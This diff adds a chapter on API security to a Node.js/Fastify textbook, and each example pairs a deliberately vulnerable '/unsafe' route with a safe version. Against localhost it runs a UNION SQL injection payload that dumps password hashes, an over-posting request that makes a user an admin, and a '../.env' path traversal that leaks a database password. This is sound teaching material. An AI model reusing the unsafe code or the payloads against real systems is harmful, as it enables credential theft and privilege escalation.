@@ -23,6 +23,8 @@
 @page ch07:first { @top-center { content: none; } }
 @page ch08 { @top-center { content: "Chapter 8: Authentication and Authorisation"; } }
 @page ch08:first { @top-center { content: none; } }
+@page ch09 { @top-center { content: "Chapter 9: Security: The OWASP Top 10"; } }
+@page ch09:first { @top-center { content: none; } }
 @page answers { @top-center { content: "Answers to the Exercises"; } }
 @page answers:first { @top-center { content: none; } }
 </style></head>
@@ -4422,6 +4424,424 @@ test(<span class="s">&quot;refuses /me without a token&quot;</span>, <span class
 <p>Users can sign in; now the API must survive people who try to break it. Security: injection, cross-site attacks, secrets, headers, dependencies, and the OWASP list of what goes wrong most often.</p>
 </div>
 </section>
+<section class="chapter" style="page: ch09" data-chapter="9" data-code="b3/node/security/en">
+<div class="opener"><span class="opener-num">9</span><p class="chapter-kicker">Chapter 9</p><h1>Security: Attacks and Defences</h1><div class="opener-bit"><svg viewBox="0 0 120 140" aria-hidden="true">
+<path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<path d="M88,104 Q104,96 106,80" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/><circle cx="106" cy="76" r="7" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="34" y="90" width="52" height="40" rx="13" fill="#c8c8c8" stroke="#1a1a1a" stroke-width="3"/>
+<circle cx="60" cy="108" r="7" fill="#8c8c8c" stroke="#1a1a1a" stroke-width="2.5"/>
+<line x1="60" y1="10" x2="60" y2="24" stroke="#1a1a1a" stroke-width="3.5"/>
+<circle cx="60" cy="8" r="6.5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="6" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="102" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="14" y="22" width="92" height="72" rx="24" fill="#a3a3a3" stroke="#1a1a1a" stroke-width="3.5"/>
+<rect x="24" y="33" width="72" height="50" rx="16" fill="#f2f2f2"/>
+<ellipse cx="33" cy="70" rx="5" ry="3" fill="#d4d4d4"/><ellipse cx="87" cy="70" rx="5" ry="3" fill="#d4d4d4"/>
+<ellipse cx="46" cy="55" rx="6" ry="7.5" fill="#111111"/><ellipse cx="74" cy="55" rx="6" ry="7.5" fill="#111111"/><circle cx="48" cy="52" r="2.2" fill="#fff"/><circle cx="76" cy="52" r="2.2" fill="#fff"/><path d="M48,68 Q60,78 72,68" fill="none" stroke="#111111" stroke-width="3.5" stroke-linecap="round"/>
+</svg></div></div>
+
+<div class="goals">
+<p class="goals-title">In this chapter you will learn to</p>
+<ul>
+<li>think like an attacker, using the OWASP Top 10 as a map</li>
+<li>see SQL injection steal password hashes, and make it impossible with parameters</li>
+<li>stop clients from writing fields they must not touch</li>
+<li>keep user input out of file paths and other dangerous places</li>
+<li>protect browser users with security headers, CORS and safe cookies</li>
+<li>handle limits, secrets, configuration and dependencies like a professional</li>
+</ul>
+</div>
+
+<p class="lead">Every API on the internet is probed by scripts within hours of going online. Most of what they try is old and well known, and most successful attacks still use the same few mistakes: input treated as code, missing checks, secrets in the wrong place. This chapter commits those mistakes on purpose. Each attack gets two routes side by side, the obvious version under <code>/unsafe</code> and the safe one, and every attack is run for real with <code>curl</code>. Seeing your own server hand over its password hashes is the fastest way to never write that code again.</p>
+
+<div class="bit"><svg viewBox="0 0 120 140" aria-hidden="true">
+<path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<path d="M88,104 Q100,112 100,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<rect x="34" y="90" width="52" height="40" rx="13" fill="#c8c8c8" stroke="#1a1a1a" stroke-width="3"/>
+<circle cx="60" cy="108" r="7" fill="#8c8c8c" stroke="#1a1a1a" stroke-width="2.5"/>
+<line x1="60" y1="10" x2="60" y2="24" stroke="#1a1a1a" stroke-width="3.5"/>
+<circle cx="60" cy="8" r="6.5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="6" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="102" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="14" y="22" width="92" height="72" rx="24" fill="#a3a3a3" stroke="#1a1a1a" stroke-width="3.5"/>
+<rect x="24" y="33" width="72" height="50" rx="16" fill="#f2f2f2"/>
+<ellipse cx="33" cy="70" rx="5" ry="3" fill="#d4d4d4"/><ellipse cx="87" cy="70" rx="5" ry="3" fill="#d4d4d4"/>
+<circle cx="46" cy="55" r="8.5" fill="#111111"/><circle cx="74" cy="55" r="8.5" fill="#111111"/><circle cx="49" cy="52" r="3" fill="#fff"/><circle cx="77" cy="52" r="3" fill="#fff"/><ellipse cx="60" cy="72" rx="5" ry="6" fill="#111111"/>
+</svg><div class="bubble"><p class="bubble-name">Bit</p><p>The first time I ran a security scanner against an API I had built, it found a search box that accepted SQL. I had used string templates because they were “just for a search”. Within a minute, the scanner had listed every table in my database. Nothing was stolen, because it was a test server. It was the most useful minute of my career.</p></div></div>
+
+<h2><span class="sec">9.1</span> <span>Thinking like an attacker</span></h2>
+
+<p>An attacker reads your API differently from a user: every input is a chance to make the server do something it was not meant to do. The <dfn>OWASP Top 10</dfn>, a list kept by the Open Worldwide Application Security Project from data on real breaches, names the most common ways this succeeds. Its 2025 edition, and where this book deals with each:</p>
+
+<table>
+<thead><tr><th>Risk</th><th>In short</th><th>Where</th></tr></thead>
+<tbody>
+<tr><td>Broken access control</td><td>Users reach data or actions that are not theirs</td><td>Chapter 8, and 9.3</td></tr>
+<tr><td>Security misconfiguration</td><td>Defaults, debug output, missing headers</td><td>9.5 and 9.7</td></tr>
+<tr><td>Software supply chain failures</td><td>Vulnerable or malicious dependencies</td><td>9.8</td></tr>
+<tr><td>Cryptographic failures</td><td>Weak hashing, no HTTPS, secrets in clear</td><td>Chapter 8, and 9.7</td></tr>
+<tr><td>Injection</td><td>Input executed as SQL, commands or HTML</td><td>9.2 and 9.5</td></tr>
+<tr><td>Insecure design</td><td>The flaw is in the plan, not the code</td><td>Every chapter’s “professional habit”</td></tr>
+<tr><td>Authentication failures</td><td>Guessable passwords, unlimited attempts</td><td>Chapter 8</td></tr>
+<tr><td>Software or data integrity failures</td><td>Trusting updates or data that were not checked</td><td>9.8</td></tr>
+<tr><td>Security logging and alerting failures</td><td>Attacks that nobody notices</td><td>Chapter 13</td></tr>
+<tr><td>Mishandling of exceptional conditions</td><td>Errors that leak details or fail open</td><td>9.6, and Chapter 3</td></tr>
+</tbody>
+</table>
+
+<p>Two principles run through all of it. <strong>Never trust input</strong>: anything from the client (body, query, headers, cookies, file names) may be written by an attacker. And <strong>defence in depth</strong>: each layer assumes the one before it might fail.</p>
+
+<h2><span class="sec">9.2</span> <span>Injection</span></h2>
+
+<p>The search below builds its SQL with a template string. For an ordinary search it works perfectly, which is exactly why this bug survives code review:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">src/routes/search.ts</div><pre class="code"><span class="k">export</span> <span class="k">const</span> searchRoutes: FastifyPluginAsyncZod = <span class="k">async</span> (app) =&gt; {
+  app.get(
+    <span class="s">&quot;/unsafe/products&quot;</span>,
+    { schema: { querystring: Query } },
+    <span class="k">async</span> (request) =&gt; {
+      <span class="c line-bidi">// DANGER: the input becomes part of the SQL text</span>
+      <span class="k">const</span> sql = <span class="s">`SELECT name, price FROM products WHERE name = &#x27;${request.query.q}&#x27;`</span>;
+      <span class="k">return</span> (<span class="k">await</span> db.query(sql)).rows;
+    },
+  );
+
+  app.get(<span class="s">&quot;/products&quot;</span>, { schema: { querystring: Query } }, <span class="k">async</span> (request) =&gt; {
+    <span class="c line-bidi">// the input travels separately, as $1: it is only ever a value</span>
+    <span class="k">const</span> sql = <span class="s">&quot;SELECT name, price FROM products WHERE name = $1&quot;</span>;
+    <span class="k">return</span> (<span class="k">await</span> db.query(sql, [request.query.q])).rows;
+  });
+};</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># An ordinary search</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:3000/unsafe/products --data-urlencode &quot;q=Robot kit&quot; | jq -c</span>
+[{&quot;name&quot;:&quot;Robot kit&quot;,&quot;price&quot;:45000}]
+<span class="c line-bidi"># The same search, with SQL in the input</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:3000/unsafe/products --data-urlencode &quot;q=x&#x27; UNION SELECT email || &#x27; &#x27; || password_hash, 0 FROM users --&quot; | jq -c &#x27;.[]&#x27;</span>
+{&quot;name&quot;:&quot;sara@example.com scrypt$32768$nNSMalEv_zb9$Kj18iYtLJHiZb&quot;,&quot;price&quot;:0}
+{&quot;name&quot;:&quot;omar@example.com scrypt$32768$j84P2D9FMN8n$6kpcvb9TyJSt0&quot;,&quot;price&quot;:0}
+<span class="c line-bidi"># The same input, as a parameter</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:3000/products --data-urlencode &quot;q=x&#x27; UNION SELECT email || &#x27; &#x27; || password_hash, 0 FROM users --&quot; | jq -c</span>
+[]</pre></div>
+
+<p>The attacker’s input closed the quote, added a <code>UNION</code> that reads the users table, and commented out the rest with <code>--</code>. The database cannot tell which part of the text came from the programmer and which from the attacker, so it ran all of it, and the response contains every email and password hash. With a little more work the same hole reads any table, changes data, or worse.</p>
+
+<p>The safe route sends the same input as a <dfn>parameter</dfn>: the SQL text, with <code>$1</code>, and the value travel to PostgreSQL separately, so the value can never become code. It simply searched for a product with that strange name, and found none. Kysely and every serious query builder or ORM do this for every value, which is one more reason to use them. The danger remains wherever text is pasted into SQL:</p>
+<ul>
+<li>Raw SQL helpers (<code>sql.raw</code> in Kysely, <code>query()</code> with a template): use their parameter form, never string building.</li>
+<li><strong>Identifiers</strong> such as a column to sort by cannot be parameters. Check them against a fixed list: <code>sort</code> must be one of <code>"name"</code> or <code>"price"</code>, as Chapter 3’s schemas did.</li>
+<li>The same bug exists outside SQL: shell commands built from input (use <code>execFile</code> with an array of arguments, not <code>exec</code> with a string), NoSQL filters built from JSON the client sent, and HTML built from input (section 9.5).</li>
+</ul>
+
+<h2><span class="sec">9.3</span> <span>Over-posting</span></h2>
+
+<p>A profile update that writes whatever fields arrive is convenient: add a column, and the route supports it at once. It also supports columns nobody meant to expose:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">src/routes/users.ts</div><pre class="code"><span class="k">export</span> <span class="k">const</span> userRoutes: FastifyPluginAsyncZod = <span class="k">async</span> (app) =&gt; {
+  app.patch(
+    <span class="s">&quot;/unsafe/users/:id&quot;</span>,
+    { schema: { params: Id, body: z.record(z.string(), z.string()) } },
+    <span class="k">async</span> (request) =&gt; {
+      <span class="c line-bidi">// DANGER: every field the client sends is written, role included</span>
+      <span class="k">const</span> fields = Object.keys(request.body);
+      <span class="k">const</span> set = fields.map((f, i) =&gt; <span class="s">`&quot;${f}&quot; = $${i + 2}`</span>).join(<span class="s">&quot;, &quot;</span>);
+      <span class="k">const</span> values = [request.params.id, ...Object.values(request.body)];
+      <span class="k">const</span> sql = <span class="s">`UPDATE users SET ${set} WHERE id = $1 ${show}`</span>;
+      <span class="k">return</span> (<span class="k">await</span> db.query(sql, values)).rows[<span class="n">0</span>];
+    },
+  );
+
+  app.patch(
+    <span class="s">&quot;/users/:id&quot;</span>,
+    {
+      schema: {
+        params: Id,
+        <span class="c line-bidi">// only the fields a customer may change; any other key is refused</span>
+        body: z.strictObject({ name: z.string().trim().min(<span class="n">1</span>).max(<span class="n">100</span>) }),
+      },
+    },
+    <span class="k">async</span> (request) =&gt; {
+      <span class="k">const</span> sql = <span class="s">`UPDATE users SET name = $2 WHERE id = $1 ${show}`</span>;
+      <span class="k">return</span> (<span class="k">await</span> db.query(sql, [request.params.id, request.body.name])).rows[<span class="n">0</span>];
+    },
+  );
+};</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># Omar changes his name, and his role</span>
+<span class="c">$ </span><span class="k">curl -s -X PATCH localhost:3000/unsafe/users/2 -H &#x27;content-type: application/json&#x27; -d &#x27;{&quot;name&quot;:&quot;Omar&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27; | jq -c</span>
+{&quot;id&quot;:2,&quot;name&quot;:&quot;Omar&quot;,&quot;role&quot;:&quot;admin&quot;}
+<span class="c line-bidi"># The same request, on the safe route</span>
+<span class="c">$ </span><span class="k">curl -s -X PATCH localhost:3000/users/2 -H &#x27;content-type: application/json&#x27; -d &#x27;{&quot;name&quot;:&quot;Omar&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27; | jq -c</span>
+{&quot;title&quot;:&quot;Invalid body&quot;,&quot;status&quot;:422}</pre></div>
+
+<p>Omar sent one extra field and became an admin. This is <dfn>over-posting</dfn> (or <dfn>mass assignment</dfn>), a form of broken access control. The unsafe route has a second hole: it pastes the client’s field names into the SQL, so a key like <code>role" = 'admin', "name</code> would be injection again. The fix is the same as in every chapter so far: a <strong>strict schema</strong> that lists exactly what this route accepts. <code>z.strictObject</code> refuses unknown keys instead of ignoring them, so a client that sends <code>role</code> learns it is not allowed rather than wondering why nothing happened. Changing a role is a different route, for admins only.</p>
+
+<h2><span class="sec">9.4</span> <span>Paths and other dangerous places</span></h2>
+
+<p>Serving files from a folder by name looks harmless. But a name is input, and <code>..</code> means “the folder above”:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">src/routes/files.ts</div><pre class="code"><span class="k">export</span> <span class="k">const</span> fileRoutes: FastifyPluginAsync = <span class="k">async</span> (app) =&gt; {
+  app.get&lt;{ Params: { <span class="s">&quot;*&quot;</span>: string } }&gt;(
+    <span class="s">&quot;/unsafe/files/*&quot;</span>,
+    <span class="k">async</span> (request, reply) =&gt; {
+      <span class="c line-bidi">// DANGER: &#x27;../&#x27; climbs out of the folder</span>
+      <span class="k">const</span> file = path.join(folder, request.params[<span class="s">&quot;*&quot;</span>]);
+      <span class="k">return</span> reply.<span class="k">type</span>(<span class="s">&quot;text/plain&quot;</span>).send(<span class="k">await</span> readFile(file, <span class="s">&quot;utf8&quot;</span>));
+    },
+  );
+
+  app.get&lt;{ Params: { <span class="s">&quot;*&quot;</span>: string } }&gt;(<span class="s">&quot;/files/*&quot;</span>, <span class="k">async</span> (request, reply) =&gt; {
+    <span class="c line-bidi">// resolve the full path, then check it is still inside the folder</span>
+    <span class="k">const</span> file = path.resolve(folder, request.params[<span class="s">&quot;*&quot;</span>]);
+    <span class="k">if</span> (!file.startsWith(folder + path.sep)) <span class="k">return</span> reply.callNotFound();
+    <span class="k">return</span> reply.<span class="k">type</span>(<span class="s">&quot;text/plain&quot;</span>).send(<span class="k">await</span> readFile(file, <span class="s">&quot;utf8&quot;</span>));
+  });
+};</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># A public file</span>
+<span class="c">$ </span><span class="k">curl -s localhost:3000/unsafe/files/terms.txt</span>
+Terms of sale: prices include VAT; returns within 14 days.
+<span class="c line-bidi"># Climbing out of the folder</span>
+<span class="c">$ </span><span class="k">curl -s --path-as-is localhost:3000/unsafe/files/../.env</span>
+DATABASE_URL=postgres://bit:secret@localhost:5432/shop
+ALLOWED_ORIGIN=https://shop.example
+<span class="c line-bidi"># The same path, on the safe route</span>
+<span class="c">$ </span><span class="k">curl -s --path-as-is localhost:3000/files/../.env | jq -c</span>
+{&quot;title&quot;:&quot;Not found&quot;,&quot;status&quot;:404}</pre></div>
+
+<p>This is <dfn>path traversal</dfn>, and here it handed over the <code>.env</code> file with the database password. The safe route resolves the full path and checks that it is still inside the public folder before reading. Even better is not to use the client’s text as a path at all: store files under random names, keep the original name in the database, and look up by id.</p>
+
+<p>The same idea applies to every place where input reaches something powerful:</p>
+<ul>
+<li><strong>URLs the server fetches</strong> (“import a product image from this address”). An attacker gives <code>http://localhost:5432</code> or the cloud provider’s internal metadata address, and your server, inside your network, fetches it for them. This is <dfn>server-side request forgery</dfn> (SSRF), exercise 5.</li>
+<li><strong>Redirects</strong> (<code>?next=…</code> after sign-in): only allow paths on your own site, or an attacker sends users to a fake copy of it.</li>
+<li><strong>Regular expressions</strong> built from input, or slow ones run on long input, can freeze the event loop for seconds.</li>
+</ul>
+
+<aside class="box warn"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3 22 20H2z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17" r="1.3" fill="currentColor"/></svg>Watch out: validation is not escaping</p><p>Validating input (“the name is 1 to 100 characters”) and making it safe for a destination (SQL, a path, HTML, a shell) are different jobs. A perfectly valid product name can contain a quote, <code>..</code> or <code>&lt;script&gt;</code>. Validate at the edge, and make values safe where they are used, with the tool made for that destination: parameters, path checks, the template’s escaping.</p></aside>
+
+<h2><span class="sec">9.5</span> <span>Protecting browser users</span></h2>
+
+<p>An API is often called from a website, and the browser adds attacks of its own. Three are worth knowing by name:</p>
+<ul>
+<li><dfn>Cross-site scripting</dfn> (XSS): an attacker gets their script into a page other people see, for example as a product review, and it runs with the visitor’s session. An API protects itself by returning JSON with the right <code>Content-Type</code>, never HTML built from input; the frontend protects itself by escaping, which Vue and React do by default everywhere except <code>v-html</code> and <code>dangerouslySetInnerHTML</code>.</li>
+<li><dfn>Clickjacking</dfn>: your page is loaded invisibly inside another site, and the user is tricked into clicking your buttons.</li>
+<li><dfn>Cross-site request forgery</dfn> (CSRF): another site makes the browser send a request to yours, and the browser attaches your cookies. Cookies with <code>SameSite=Lax</code> (or <code>Strict</code>) are not sent with such requests; tokens in the <code>Authorization</code> header, as in Chapter 8, are never sent automatically at all.</li>
+</ul>
+
+<p>Browsers can refuse much of this if the server asks them to, with <dfn>security headers</dfn>. The <code>@fastify/helmet</code> plugin sets a sensible set on every response:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">src/app.ts</div><pre class="code"><span class="k">export</span> <span class="k">async</span> <span class="k">function</span> buildApp() {
+  <span class="c line-bidi">// bodies above 100 KB are refused before they are read</span>
+  <span class="k">const</span> app = Fastify({ bodyLimit: <span class="n">100</span> * <span class="n">1024</span> });
+  app.setValidatorCompiler(validatorCompiler);
+  app.setSerializerCompiler(serializerCompiler);
+
+  <span class="c line-bidi">// security headers on every response</span>
+  <span class="k">await</span> app.register(helmet);
+  <span class="c line-bidi">// browsers may call this API only from the shop&#x27;s own website</span>
+  <span class="k">await</span> app.register(cors, {
+    origin: [config.ALLOWED_ORIGIN],
+    methods: [<span class="s">&quot;GET&quot;</span>, <span class="s">&quot;PATCH&quot;</span>],
+  });</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># The headers of every response</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:3000/files/terms.txt</span>
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src &#x27;self&#x27;;base-uri &#x27;self&#x27;;font-src &#x27;self&#x27; https: data:;form-action &#x27;self&#x27;;frame-ancestors &#x27;self&#x27;;img-src &#x27;self&#x27; data:;object-src &#x27;none&#x27;;script-src &#x27;self&#x27;;script-src-attr &#x27;none&#x27;;style-src &#x27;self&#x27; https: &#x27;unsafe-inline&#x27;;upgrade-insecure-requests
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+vary: Origin
+content-type: text/plain</pre></div>
+
+<ul>
+<li><code>Content-Security-Policy</code> lists where scripts, styles and images may come from; an injected script from elsewhere, or inline, is refused. It is the strongest defence against XSS in pages.</li>
+<li><code>Strict-Transport-Security</code> tells the browser to use only HTTPS for this site for a year, so nobody can downgrade a visit to plain HTTP.</li>
+<li><code>X-Frame-Options</code> and <code>frame-ancestors</code> stop other sites from framing yours; <code>X-Content-Type-Options: nosniff</code> stops the browser from guessing that a text file is a script.</li>
+</ul>
+
+<p><dfn>CORS</dfn> (cross-origin resource sharing) is the other half. By default a script on <code>evil.example</code> may send a request to your API but may not read the answer. CORS headers relax that for the origins you name, and only for them:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># A request from the shop&#x27;s website</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:3000/files/terms.txt -H &#x27;Origin: https://shop.example&#x27; | grep -i &#x27;^HTTP\|^access-control\|^vary&#x27;</span>
+HTTP/1.1 200 OK
+vary: Origin
+access-control-allow-origin: https://shop.example
+<span class="c line-bidi"># A request from another website</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:3000/files/terms.txt -H &#x27;Origin: https://evil.example&#x27; | grep -i &#x27;^HTTP\|^access-control\|^vary&#x27;</span>
+HTTP/1.1 200 OK
+vary: Origin</pre></div>
+
+<p>The shop’s website got <code>Access-Control-Allow-Origin</code>; the other website did not, so a browser will hide the response from its script. Note what CORS is <em>not</em>: it does not stop <code>curl</code>, scripts or servers, which ignore it, and it does not stop the request from reaching your server. It protects users’ browsers, not your API; authentication and authorization still do that. Never answer every origin with <code>*</code> on an API that uses cookies.</p>
+
+<aside class="box quiz"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9.5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M9.3 9.3a2.8 2.8 0 1 1 3.9 2.6c-.8.4-1.2 1-1.2 1.9v.6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="17.3" r="1.3" fill="currentColor"/></svg>Quick check</p><ol><li>Why does a parameter stop SQL injection when escaping quotes by hand often fails?</li><li>The safe users route uses <code>z.strictObject</code>. What would a plain <code>z.object</code> do with an extra <code>role</code> field?</li><li>A request from <code>evil.example</code> reached the server in the CORS example. Why is that not a problem?</li></ol><p>The answers are at the end of the chapter, after the summary.</p></aside>
+
+<h2><span class="sec">9.6</span> <span>Limits</span></h2>
+
+<p>An attacker does not need to break in to hurt you; making the server too busy for real users is enough. Every input needs a size:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># A body of 200 KB</span>
+<span class="c">$ </span><span class="k">head -c 200000 /dev/zero | tr &#x27;\0&#x27; &#x27;a&#x27; | sed &#x27;s/.*/{&quot;name&quot;:&quot;&amp;&quot;}/&#x27; | curl -s -X PATCH localhost:3000/users/2 -H &#x27;content-type: application/json&#x27; --data-binary @- | jq -c</span>
+{&quot;title&quot;:&quot;Body too large&quot;,&quot;status&quot;:413}</pre></div>
+
+<p>The body limit refused 200 KB before parsing it. The same thinking applies everywhere: a maximum length on every string in every schema (the search accepts 100 characters), a maximum page size on every list, a rate limit on expensive routes (Chapter 3), timeouts on calls to other services, and a limit on upload sizes. Errors must not help the attacker either: the error handler logs the details and sends the client only a title and a status, never a stack trace or a SQL message.</p>
+
+<h2><span class="sec">9.7</span> <span>Secrets and configuration</span></h2>
+
+<p>The <code>.env</code> file that path traversal leaked holds the most valuable things the application has: database passwords, API keys, signing secrets. Rules for them:</p>
+<ul>
+<li><strong>Never in the repository.</strong> <code>.env</code> is in <code>.gitignore</code> from the first commit; a file <code>.env.example</code> with every name and no real value documents what is needed. A secret pushed once is in the history forever: change it, do not just delete the file.</li>
+<li><strong>Different in every environment</strong>, set by the platform (Chapter 16’s containers receive them as environment variables) or by a secret manager, and changed when someone leaves the team.</li>
+<li><strong>Never logged.</strong> Log requests without their <code>Authorization</code> header and bodies without passwords.</li>
+<li><strong>Checked at start-up.</strong> A server that starts with a wrong setting fails later, at the worst moment and with a confusing error:</li>
+</ul>
+
+<div class="listing" dir="ltr"><div class="listing-title">src/config.ts</div><pre class="code"><span class="k">import</span> { z } <span class="k">from</span> <span class="s">&quot;zod&quot;</span>;
+
+<span class="c line-bidi">// checked once, at start-up: a missing or wrong setting stops the server at once</span>
+<span class="k">const</span> Config = z.object({
+  DATABASE_URL: z.url(),
+  ALLOWED_ORIGIN: z.url(),
+  PORT: z.coerce.number().int().<span class="k">default</span>(<span class="n">3000</span>),
+});
+
+<span class="k">const</span> parsed = Config.safeParse(process.env);
+<span class="k">if</span> (!parsed.success) {
+  console.error(<span class="s">&quot;Invalid configuration:&quot;</span>);
+  <span class="k">for</span> (<span class="k">const</span> issue <span class="k">of</span> parsed.error.issues) {
+    console.error(<span class="s">`  ${issue.path.join(&quot;.&quot;)}: ${issue.message}`</span>);
+  }
+  process.exit(<span class="n">1</span>);
+}
+<span class="k">export</span> <span class="k">const</span> config = parsed.data;</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># A wrong setting at start-up</span>
+<span class="c">$ </span><span class="k">ALLOWED_ORIGIN=shop node --env-file=.env src/server.ts</span>
+Invalid configuration:
+  ALLOWED_ORIGIN: Invalid URL</pre></div>
+
+<p>The rest of the code imports <code>config</code> instead of reading <code>process.env</code>, so every setting has a type, a check and one place where it is documented.</p>
+
+<h2><span class="sec">9.8</span> <span>Dependencies</span></h2>
+
+<p>The shop’s code is a few hundred lines; the packages in <code>node_modules</code> are hundreds of thousands. Most attacks on a modern application could arrive through them: a known vulnerability in an old version, or a malicious package, a typo away from a popular one (<code>expresss</code>), or an honest package whose maintainer’s account was stolen. Habits that keep the risk small:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># Known vulnerabilities in the dependencies</span>
+<span class="c">$ </span><span class="k">npm audit</span>
+found 0 vulnerabilities</pre></div>
+
+<ul>
+<li><code>npm audit</code> checks every installed version against a database of known vulnerabilities; run it in CI, and fail the build on high and critical findings.</li>
+<li>Commit the lockfile and install with <code>npm ci</code>, so every machine gets exactly the versions you tested.</li>
+<li>Let a bot (Dependabot, Renovate) open pull requests for updates, so they arrive small and often, with tests, instead of once a year in a panic.</li>
+<li>Before adding a package, look at who maintains it, how many people use it, and whether a few lines of your own would do. Every dependency is code you run with your server’s full permissions.</li>
+</ul>
+
+<aside class="box rule"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="9" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8.5 14 7 22l5-2.5L17 22l-1.5-8" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>Professional habit: a security checklist in every review</p><p>Keep a short checklist next to your pull request template: Is every input validated with a size? Does any input reach SQL, a path, a URL, a shell or HTML? Is every new route behind authentication and authorization, with a test for the “no”? Are there new secrets, and are they outside the code? Are new dependencies needed and maintained? Thirty seconds per review prevents most of this chapter.</p></aside>
+
+<h2 class="plain-h">Common mistakes</h2>
+
+<table>
+<thead><tr><th>Mistake</th><th>What happens</th><th>Fix</th></tr></thead>
+<tbody>
+<tr><td>SQL built with template strings</td><td>Attackers read or change any table</td><td>Parameters; an allowlist for identifiers</td></tr>
+<tr><td>Writing every field the client sends</td><td>Customers make themselves admins</td><td>Strict schemas listing the allowed fields</td></tr>
+<tr><td>User input in file paths</td><td>Secrets and source code read from disk</td><td>Resolve and check, or random names and ids</td></tr>
+<tr><td>Fetching URLs the client chose</td><td>The server attacks your own network</td><td>Allowlists of hosts, no internal addresses</td></tr>
+<tr><td>HTML built from input</td><td>Scripts run in other users’ browsers</td><td>JSON APIs, escaping, a Content Security Policy</td></tr>
+<tr><td><code>Access-Control-Allow-Origin: *</code> with cookies</td><td>Any site acts as the user</td><td>An allowlist of origins</td></tr>
+<tr><td>No size limits</td><td>One request ties up the server</td><td>Body limits, string lengths, page sizes</td></tr>
+<tr><td>Secrets in the repository or the logs</td><td>Anyone with the code has the keys</td><td><code>.gitignore</code>, environment variables, rotation</td></tr>
+<tr><td>Never updating dependencies</td><td>Known holes stay open for years</td><td><code>npm audit</code> in CI, small regular updates</td></tr>
+</tbody>
+</table>
+
+<h2 class="plain-h">Summary</h2>
+
+<ul class="summary">
+<li><strong>Never trust input</strong>, and defend in depth; the <strong>OWASP Top 10</strong> is the map of what goes wrong most.</li>
+<li><strong>Injection</strong> happens when input becomes code: SQL takes <strong>parameters</strong>, identifiers take an allowlist.</li>
+<li><strong>Strict schemas</strong> stop over-posting; checked paths stop traversal; allowlists stop SSRF and open redirects.</li>
+<li>Browsers are protected by <strong>security headers</strong> (CSP, HSTS, framing), <strong>CORS</strong> for named origins, and <code>SameSite</code> cookies.</li>
+<li>Every input has a <strong>size</strong>, and errors reveal nothing.</li>
+<li><strong>Secrets</strong> live outside the code and the logs; configuration is <strong>checked at start-up</strong>; dependencies are audited and updated often.</li>
+</ul>
+
+<p class="answers-note"><strong>Quick check answers:</strong> 1. With a parameter, the SQL text and the value are sent separately, so the database never parses the value as SQL, whatever characters it contains. Escaping by hand tries to make the value harmless inside the text, and must anticipate every special character, encoding and database quirk; missing one is enough. 2. It would accept the body and silently drop <code>role</code>, so Omar would not become an admin, but he would also not be told that the field is not allowed, and a later change to the code might start using it. <code>strictObject</code> refuses the request with 422. 3. CORS is not meant to stop requests; it stops a browser from letting a script on another site read the response. The server still checks who is calling and what they may do; and the request here changed nothing.</p>
+
+<!-- projects -->
